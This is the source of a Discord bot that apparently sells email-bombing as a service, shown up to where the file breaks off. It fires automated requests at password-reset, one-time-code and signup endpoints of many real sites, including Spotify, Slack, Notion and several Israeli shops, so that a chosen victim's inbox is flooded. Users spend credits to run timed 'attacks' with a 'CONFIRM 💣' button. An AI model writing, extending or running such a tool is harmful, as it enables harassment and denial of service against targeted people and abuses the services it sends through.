import os
import json
import random
import asyncio
import time
import re
import datetime
import uuid as _uuid
import aiohttp
import firebase_admin
from firebase_admin import credentials, db
import discord
from discord import app_commands
from discord.ext import commands

class DailyCreditView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Claim 5 Credits", style=discord.ButtonStyle.danger, emoji="🎁", custom_id="daily_claim_btn")
    async def claim_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        pass

class StormBomberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        self.add_view(DailyCreditView())
        await self.tree.sync()
        print("🔄 Email bot commands synced successfully!")

bot = StormBomberBot()

LOG_CHANNEL_ID = 1505635730289066036
ADMIN_ROLE_ID = 1499497341693202664
ALLOWED_USERS = [
    1483411120961093642,
    1493293951959044147,
    1130542850883469443,
]

active_spam_tasks: dict[int, asyncio.Task] = {}
tempRequests = {}
activeDrops = {}

try:
    firebase_config = os.getenv("FIREBASE_CONFIG") or os.getenv("FIREBASE_SERVICE_ACCOUNT")
    if not firebase_config:
        raise RuntimeError("Missing FIREBASE_CONFIG or FIREBASE_SERVICE_ACCOUNT environment variable")

    firebase_config = json.loads(firebase_config)
    cred = credentials.Certificate(firebase_config)

    firebase_database_url = os.getenv("FIREBASE_DATABASE_URL")
    if not firebase_database_url:
        raise RuntimeError("Missing FIREBASE_DATABASE_URL environment variable")

    firebase_admin.initialize_app(cred, {
        'databaseURL': firebase_database_url
    })
    print("✅ Firebase initialized for email bot!")
except Exception as e:
    print("Firebase Error:", e)


def is_manager(interaction: discord.Interaction) -> bool:
    if interaction.user.id in ALLOWED_USERS:
        return True
    member = interaction.user
    if interaction.guild and isinstance(member, discord.Member):
        return any(role.id == ADMIN_ROLE_ID for role in member.roles)
    return False

async def send_detailed_log(title, user, details, color=0x5865F2):
    try:
        ch = bot.get_channel(LOG_CHANNEL_ID) or await bot.fetch_channel(LOG_CHANNEL_ID)
        if not ch:
            return
        embed = discord.Embed(title=title, color=color)
        embed.set_thumbnail(url=user.display_avatar.url)
        embed.add_field(name="👤 User:", value=f"{user.mention} (`{user.id}`)", inline=False)
        for detail in details:
            embed.add_field(name=detail["name"], value=detail["value"], inline=False)
        await ch.send(embed=embed)
    except Exception:
        pass


def random_ua() -> str:
    return (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
    )

async def _async_req(session, method, url, data=None, json_body=None, extra_headers=None, label=""):
    headers = {
        "User-Agent": random_ua(),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    if extra_headers:
        headers.update(extra_headers)

    if isinstance(data, str):
        headers.setdefault("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")

    try:
        timeout = aiohttp.ClientTimeout(total=12)
        method_name = method.upper()
        if method_name == "POST":
            if json_body is not None:
                headers.setdefault("Content-Type", "application/json")
                async with session.post(url, json=json_body, headers=headers, timeout=timeout, ssl=False) as r:
                    await r.read()
                    ok = 200 <= r.status < 300
                    return ok, label, "OK" if ok else f"HTTP {r.status}"
            async with session.post(url, data=data, headers=headers, timeout=timeout, ssl=False) as r:
                await r.read()
                ok = 200 <= r.status < 300
                return ok, label, "OK" if ok else f"HTTP {r.status}"
        elif method_name == "PUT":
            if json_body is not None:
                headers.setdefault("Content-Type", "application/json")
                async with session.put(url, json=json_body, headers=headers, timeout=timeout, ssl=False) as r:
                    await r.read()
                    ok = 200 <= r.status < 300
                    return ok, label, "OK" if ok else f"HTTP {r.status}"
            async with session.put(url, data=data, headers=headers, timeout=timeout, ssl=False) as r:
                await r.read()
                ok = 200 <= r.status < 300
                return ok, label, "OK" if ok else f"HTTP {r.status}"
        else:
            async with session.get(url, headers=headers, timeout=timeout, ssl=False) as r:
                await r.read()
                ok = 200 <= r.status < 300
                return ok, label, "OK" if ok else f"HTTP {r.status}"
    except Exception as e:
        return False, label, str(type(e).__name__)


def normalize_email(email: str) -> str:
    return email.strip().lower()

async def _lidorbar_login(session, email):
    return await _async_req(
        session,
        "POST",
        "https://account.lidorbar.com/authentication/login",
        json_body={
            "email": email,
            "client_id": "f602bb9e-c1e8-469e-b2ef-5a7fd5fd5fba",
            "redirect_uri": "/authentication/oauth/authorize?buyer_flags=eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJsaWRvcmJhci1zdG9yZS5teXNob3BpZnkuY29tIiwiZmxhZ3MiOltdLCJleHAiOjE3ODI2MzcyMDEsIm5iZiI6MTc4MjAzMjQwMX0.mWWI98nUfxWHnGFxdK-3UKZCLiRzae2e_wWaaUMJUWY&client_id=f602bb9e-c1e8-469e-b2ef-5a7fd5fd5fba&locale=he-IL&nonce=1569f9ab-f8ec-4a0a-83d6-77ba854b47e9&redirect_uri=https%3A%2F%2Faccount.lidorbar.com%2Fcallback&region_country=IL&response_type=code&scope=openid+email+customer-account-api%3Afull&state=hWNDaqt0GO7bzQWUwO4WQDPF",
            "region_country": "IL",
            "step": "email",
        },
        extra_headers={
            "accept": "application/json",
            "accept-language": "he-IL",
            "content-type": "application/json; charset=UTF-8",
            "origin": "https://account.lidorbar.com",
            "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            "x-csrf-token": os.getenv("LIDORBAR_CSRF_TOKEN", ""),
        },
        label="lidorbar",
    )

async def _shopify_login(session, email, shop_id, client_id, redirect_uri, locale="he-IL"):
    return await _async_req(
        session,
        "POST",
        f"https://shopify.com/authentication/{shop_id}/login",
        json_body={
            "email": email,
            "client_id": client_id,
            "redirect_uri": redirect_uri,
            "region_country": "IL",
            "step": "email",
        },
        extra_headers={
            "accept": "application/json",
            "accept-language": locale,
            "content-type": "application/json; charset=UTF-8",
            "origin": "https://shopify.com",
            "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            "x-csrf-token": os.getenv("SHOPIFY_CSRF_TOKEN", ""),
        },
        label=f"shopify-{shop_id}",
    )

async def _terminalx_password_reset(session, email):
    return await _async_req(
        session,
        "POST",
        "https://www.terminalx.com/pg/MutationRequestPasswordResetEmail?v=BrIaxjupmasQARNXVj68nnPYnXQ%3D",
        json_body={
            "email": email,
            "captchaToken": os.getenv("TERMINALX_CAPTCHA_TOKEN", ""),
        },
        extra_headers={
            "accept": "application/json, text/plain, */*",
            "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://www.terminalx.com",
            "referer": "https://www.terminalx.com/women?auth=forgot-password",
            "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
        },
        label="terminalx",
    )

async def _buyme_create_otp(session, email):
    return await _async_req(
        session,
        "POST",
        "https://buyme.co.il/siteapi/createOtp",
        json_body={"address": email, "action": 1},
        extra_headers={
            "accept": "*/*",
            "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            "authorization": "Bearer undefined",
            "content-type": "application/json",
            "origin": "https://buyme.co.il",
            "referer": "https://buyme.co.il/?modal=login",
            "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        },
        label="buyme-createotp",
    )

async def _buyme_check_email(session, email):
    return await _async_req(
        session,
        "POST",
        "https://buyme.co.il/siteapi/checkEmail",
        json_body={"address": email},
        extra_headers={
            "accept": "*/*",
            "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://buyme.co.il",
            "referer": "https://buyme.co.il/?modal=login",
            "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        },
        label="buyme-checkemail",
    )

async def _notion_get_login_options(session, email):
    return await _async_req(
        session,
        "POST",
        "https://app.notion.com/api/v3/getLoginOptions",
        json_body={"email": email, "requireWorkTypeEmail": False},
        extra_headers={
            "accept": "*/*",
            "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://app.notion.com",
            "referer": "https://app.notion.com/signup?from=marketing&pathname=%2F",
            "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
            "x-notion-active-user-header": "",
        },
        label="notion-loginoptions",
    )

async def _slack_confirm_email(session, email):
    fd = aiohttp.FormData()
    fd.add_field("email", email)
    fd.add_field("locale", "en-US")
    fd.add_field("entry_point", "resend_confirmation_code")

    return await _async_req(
        session,
        "POST",
        "https://slack.com/api/signup.confirmEmail?_x_id=noversion-1782041884.136",
        data=fd,
        extra_headers={
            "accept": "*/*",
            "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "multipart/form-data; boundary=----WebKitFormBoundarymzq0kGh9SpJ6eALD",
            "origin": "https://slack.com",
            "referer": "https://slack.com/get-started?entry_point=nav_menu",
            "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
        },
        label="slack-confirm-email",
    )

async def _restaurantdepot_reset(session, email):
    data = f"&request_type=VERIFICATION_REQUEST&claim_id=email&claim_value={email}"
    return await _async_req(
        session,
        "POST",
        "https://login.restaurantdepot.com/jrdb2cservices.onmicrosoft.com/B2C_1A_PasswordReset/SelfAsserted?tx=StateProperties=eyJUSUQiOiJjMmY2Njg5Mi03ODQwLTRhNzQtYmNlOC0zZWRjYjA3ZDk5ZWYifQ&p=B2C_1A_PasswordReset",
        data=data,
        extra_headers={
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://login.restaurantdepot.com",
            "referer": "https://login.restaurantdepot.com/jrdb2cservices.onmicrosoft.com/B2C_1A_PASSWORDRESET/oauth2/v2.0/authorize?response_type=code&client_id=8ae567c1-9a24-4fd6-b50a-c1974f703d30&scope=openid+offline_access+8ae567c1-9a24-4fd6-b50a-c1974f703d30&state=...",
            "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            "x-csrf-token": os.getenv("RESTAURANTDEPOT_CSRF_TOKEN", ""),
            "x-requested-with": "XMLHttpRequest",
        },
        label="restaurantdepot-reset",
    )

async def _everlane_login(session, email):
    return await _async_req(
        session,
        "POST",
        "https://account.everlane.com/authentication/login",
        json_body={
            "email": email,
            "client_id": "55c41b48-1540-4a24-bb1c-dfbe745d6d5e",
            "redirect_uri": "/authentication/oauth/authorize?buyer_flags=eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJtMzRremcta2UubXlzaG9waWZ5LmNvbSIsImZsYWdzIjpbIntcImZsYWdcIjp7XCJsb3dpZFwiOlwiMTA0MTcxODg4OTI1Mzg0NTIyMjlcIixcImhpZ2hpZFwiOlwiMTM2OTI3ODQzOTQyNDM1NTkzMTNcIn19Il0sImV4cCI6MTc4MjY0ODE0NiwibmJmIjoxNzgyMDQzMzQ2fQ.u5qNcnmiu_HwzP-xhyTbPk1Sp9TVMvawM4R-5DR7GE0&client_id=55c41b48-1540-4a24-bb1c-dfbe745d6d5e&locale=en-IL&nonce=ed463aa4-8fa0-416a-9ea7-8ec992be4478&redirect_uri=https%3A%2F%2Faccount.everlane.com%2Fcallback&region_country=IL&response_type=code&scope=openid+email+customer-account-api%3Afull&state=hWNDaviiVcVuO1J25ighY0Xa",
            "region_country": "IL",
            "step": "email",
        },
        extra_headers={
            "accept": "application/json",
            "accept-language": "en-IL",
            "content-type": "application/json; charset=UTF-8",
            "origin": "https://account.everlane.com",
            "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            "x-csrf-token": os.getenv("EVERLANE_CSRF_TOKEN", ""),
        },
        label="everlane",
    )

async def _carhartt_reset(session, email):
    data = (
        "lang=en&loginID=" + aiohttp.helpers.quote(email, safe="") +
        "&APIKey=4_G1z-gWiPDtmtIqrPmk36CA&source=showScreenSet&sdk=js_latest&authMode=cookie&"
        "pageURL=https%3A%2F%2Fwww.carhartt.com%2Fen-eu%2F&sdkBuild=1930&format=json"
    )
    return await _async_req(
        session,
        "POST",
        "https://accounts-cdc-emea.carhartt.com/accounts.resetPassword",
        data=data,
        extra_headers={
            "accept": "*/*",
            "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.carhartt.com",
            "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        },
        label="carhartt-reset",
    )

async def _brooksbrothers_reset(session, email):
    data = f"loginEmail={aiohttp.helpers.quote(email, safe='')}&dwfrm_recaptcha_recaptchaToken={os.getenv('BROOKSBROTHERS_RECAPTCHA_TOKEN','')}"
    return await _async_req(
        session,
        "POST",
        "https://www.brooksbrothers.com/on/demandware.store/Sites-brooksbrothers-Site/en_US/Account-PasswordResetDialogForm?mobile=",
        data=data,
        extra_headers={
            "accept": "*/*",
            "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.brooksbrothers.com",
            "referer": "https://www.brooksbrothers.com/on/demandware.store/Sites-brooksbrothers-Site/en_US/Login-Show",
            "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        },
        label="brooksbrothers-reset",
    )

async def _thereformation_reset(session, email):
    data = f"loginEmail={aiohttp.helpers.quote(email, safe='')}&csrf_token={os.getenv('THEREFORMATION_CSRF_TOKEN','')}&formName=email-form"
    return await _async_req(
        session,
        "POST",
        "https://www.thereformation.com/on/demandware.store/Sites-reformation-us-Site/en_US/Account-PasswordResetDialogForm?mobile=&pageTypeContext=Login-Show",
        data=data,
        extra_headers={
            "accept": "*/*",
            "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.thereformation.com",
            "referer": "https://www.thereformation.com/order-status",
            "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        },
        label="thereformation-reset",
    )

async def _kan_password_recovery(session, email):
    return await _async_req(
        session,
        "POST",
        "https://www.kan.org.il/api/authentication/password-recovery",
        json_body={"email": email, "rootTemplateAlias": "home", "requestType": "General"},
        extra_headers={
            "accept": "*/*",
            "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://www.kan.org.il",
            "referer": "https://www.kan.org.il/authentication/change-password/",
            "requestverificationtoken": os.getenv("KAN_REQUEST_VERIFICATION_TOKEN", ""),
            "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        },
        label="kan-password-recovery",
    )

async def _ksp_verify_email(session, email):
    return await _async_req(
        session,
        "POST",
        "https://ksp.co.il/cart/api/v0/users/verify/email",
        json_body={"email": email},
        extra_headers={
            "accept": "*/*",
            "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://ksp.co.il",
            "referer": "https://ksp.co.il/mob/account/security",
            "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
        },
        label="ksp-verify-email",
    )

async def _spotify_otp(session, email):
    encoded_email = aiohttp.helpers.quote(email, safe="")
    url = (
        "https://accounts.spotify.com/_next/data/4e9ee2e8-cd05-4d42-83d5-118f2d7c0ee1/he/login/otp.json?"
        f"continue=https%3A%2F%2Fopen.spotify.com%2F&ubi=CAIQ64Te0O4zGiQyZjA4MGM5OS0zMmJlLTRlNzAtYTRiMi00ZTA4NzI0NjNhZjgiJDVmYzMzMTYxLWVjZTYtNGEyZi04ZDQ2LWU4MTEzYzI0ZWJmZOkfUzE2YjEzMzQxNjEtZWNlNi00YTJmLThkNDYtZTgxMTNjMjRlYmZkQhB1c2VyX2ludGVyYWN0aW9uSiQ0NDE2N2Y4ZS01MmQzLTRkYWMtOTlmNi0yMzc1NjJhOWYwZTFQAA%3D%3D&"
        f"locale=he&flow_ctx=3dae88f4-6c16-46c8-b49d-db2d68e1a251%3A1782064586&login_hint={encoded_email}"
    )
    return await _async_req(
        session,
        "GET",
        url,
        extra_headers={
            "accept": "*/*",
            "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
            "x-nextjs-data": "1",
        },
        label="spotify-otp",
    )

async def fire_all_senders(email: str) -> tuple[int, list[str]]:
    e = normalize_email(email)
    FORM = "application/x-www-form-urlencoded; charset=UTF-8"
    CH = '"Google Chrome";v="145", "Chromium";v="145", "Not/A)Brand";v="24"'

    def fh(origin, referer, extra=None):
        h = {
            "Content-Type": FORM,
            "x-requested-with": "XMLHttpRequest",
            "origin": origin,
            "referer": referer,
            "sec-ch-ua": CH,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        }
        if extra:
            h.update(extra)
        return h

    def jh(origin, referer, extra=None):
        h = {
            "Content-Type": "application/json",
            "origin": origin,
            "referer": referer,
            "sec-ch-ua": CH,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
        }
        if extra:
            h.update(extra)
        return h

    connector = aiohttp.TCPConnector(limit=200, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=connector) as s:
        tasks = [
            _lidorbar_login(s, e),
            _shopify_login(
                s,
                e,
                "58123845720",
                "e7ff8b30-b194-432f-9319-0d2fdf8165fb",
                "/authentication/58123845720/oauth/authorize?buyer_flags=eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnb25zdXJmaW5nLm15c2hvcGlmeS5jb20iLCJmbGFncyI6W10sImV4cCI6MTc4MjY0NTYxNSwibmJmIjoxNzgyMDQwODE1fQ.sy2sNOBk1TVgWOMrerqheMiTL5KjlSJvwa-Xierx56g&client_id=e7ff8b30-b194-432f-9319-0d2fdf8165fb&locale=en-IL&nonce=9c79dc11-4ad0-45d7-a402-5f0165221397&redirect_uri=https%3A%2F%2Fshopify.com%2F58123845720%2Faccount%2Fcallback&region_country=IL&response_type=code&scope=openid+email+customer-account-api%3Afull&state=hWNDarQzl5MuMXjBqVLBKE6b",
                locale="en-IL",
            ),
            _shopify_login(
                s,
                e,
                "1401225329",
                "50eb44e7-a557-48d8-858e-0212641b5e25",
                "/authentication/1401225329/oauth/authorize?buyer_flags=eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJ5YWVsLW9yZ2FkLm15c2hvcGlmeS5jb20iLCJmbGFncyI6W10sImV4cCI6MTc4MjY0NjE2NCwibmJmIjoxNzgyMDQxMzY0fQ.C4VhGt6tCocKqSW5WiJ8yQkTGRh-6_3ZLdUEaEFf3UA&client_id=50eb44e7-a557-48d8-858e-0212641b5e25&locale=he-IL&nonce=c6b32f18-8e28-4be0-a2ce-8161863abed3&redirect_uri=https%3A%2F%2Fshopify.com%2F1401225329%2Faccount%2Fcallback&region_country=IL&response_type=code&scope=openid+email+customer-account-api%3Afull&state=hWNDasMPmo695SiLM33osskr",
                locale="he-IL",
            ),
            _terminalx_password_reset(s, e),
            _buyme_create_otp(s, e),
            _buyme_check_email(s, e),
            _notion_get_login_options(s, e),
            _slack_confirm_email(s, e),
            _restaurantdepot_reset(s, e),
            _everlane_login(s, e),
            _carhartt_reset(s, e),
            _brooksbrothers_reset(s, e),
            _thereformation_reset(s, e),
            _kan_password_recovery(s, e),
            _ksp_verify_email(s, e),
            _spotify_otp(s, e),
        ]

        results = await asyncio.gather(*tasks, return_exceptions=True)
        success, failed = 0, []
        for r in results:
            if isinstance(r, Exception):
                continue
            if isinstance(r, tuple) and len(r) == 3:
                ok, lbl, reason = r
                if ok:
                    success += 1
                else:
                    failed.append(f"{lbl} ({reason})")
            elif isinstance(r, tuple) and len(r) == 2:
                ok, lbl = r
                if ok:
                    success += 1
                else:
                    failed.append(lbl)

        return success, failed

async def _run_spam_task(interaction: discord.Interaction, user_id: int, email: str, credits: int, current_credits_str: str):
    try:
        total_success = 0
        total_failed_count = 0
        total_failed_details = []
        end_time = time.time() + (credits * 30)

        await send_detailed_log("🚀 Email spam attack started", interaction.user, [
            {"name": "📧 Target:", "value": email},
            {"name": "💣 Credits:", "value": str(credits)},
        ], color=0xE67E22)

        while time.time() < end_time:
            if user_id not in active_spam_tasks:
                raise asyncio.CancelledError()
            success, failed = await fire_all_senders(email)
            total_success += success
            total_failed_count += len(failed)
            if len(total_failed_details) < 10:
                total_failed_details.extend(failed)
            await asyncio.sleep(1.0)

        if current_credits_str != "lifetime":
            try:
                curr_int = int(current_credits_str or 0)
                db.reference(f"users/{user_id}").update({"credits": str(max(0, curr_int - credits))})
            except Exception as e:
                print(f"Error updating credits: {e}")

        total_requests = total_success + total_failed_count
        success_percentage = (total_success / total_requests * 100) if total_requests > 0 else 0
        message = (
            f"📊 **Email spam summary for {email}**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ **Successes:** {total_success}\n"
            f"❌ **Failed:** {total_failed_count}\n"
            f"📈 **Sent:** {total_requests}\n"
            f"🎯 **Success rate:** {success_percentage:.1f}%\n"
        )
        if total_failed_details:
            message += f"⚠️ **Errors:**\n" + "\n".join(set(total_failed_details[:5]))

        await interaction.followup.send(message, ephemeral=True)
        await send_detailed_log("🏁 Email spam attack finished", interaction.user, [
            {"name": "📧 Target:", "value": email},
            {"name": "📊 Result:", "value": f"Success: {total_success} | Failed: {total_failed_count}"},
        ], color=0x2ECC71)
    except asyncio.CancelledError:
        await interaction.followup.send("❌ Email spam cancelled.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error during spam run: {type(e).__name__}", ephemeral=True)
    finally:
        active_spam_tasks.pop(user_id, None)

class SpamEmailModal(discord.ui.Modal, title="הגדרות הפצצה באימייל"):
    email = discord.ui.TextInput(label="Email target", style=discord.TextStyle.short, required=True)
    amount = discord.ui.TextInput(label="כמות קרדיטים", style=discord.TextStyle.short, required=True)

    async def on_submit(self, interaction: discord.Interaction):
        try:
            await interaction.response.defer(ephemeral=True)
            snap = db.reference(f"users/{interaction.user.id}").get()
            cur = snap.get("credits", "0") if snap else "0"
            try:
                requested_amount = int(self.amount.value)
            except ValueError:
                return await interaction.followup.send("❌ נא להזין מספר תקין בשדה הקרדיטים", ephemeral=True)
            if requested_amount < 1:
                return await interaction.followup.send("❌ נא להזין 1 או יותר", ephemeral=True)
            if cur != "lifetime":
                try:
                    current_credits = int(cur or 0)
                except ValueError:
                    current_credits = 0
                if current_credits < requested_amount:
                    return await interaction.followup.send("❌ יתרה לא מספיקה לפעולה זו", ephemeral=True)
            if interaction.user.id in active_spam_tasks:
                return await interaction.followup.send("⚠️ כבר יש לך מתקפה פעילה באוויר. בטל אותה קודם.", ephemeral=True)
            tempRequests[interaction.user.id] = {
                "email": self.email.value,
                "amount": str(requested_amount),
                "current": cur,
            }
            view = discord.ui.View()
            btn_confirm = discord.ui.Button(label="CONFIRM 💣", style=discord.ButtonStyle.danger, custom_id=f"confirm_{interaction.user.id}")
            view.add_item(btn_confirm)
            await interaction.followup.send(f"להפציץ את **{self.email.value}** עם {requested_amount} קרדיטים?", view=view, ephemeral=True)
        except Exception:
            await interaction.followup.send("❌ התרחשה שגיאה בעיבוד הנתונים", ephemeral=True)

@bot.event
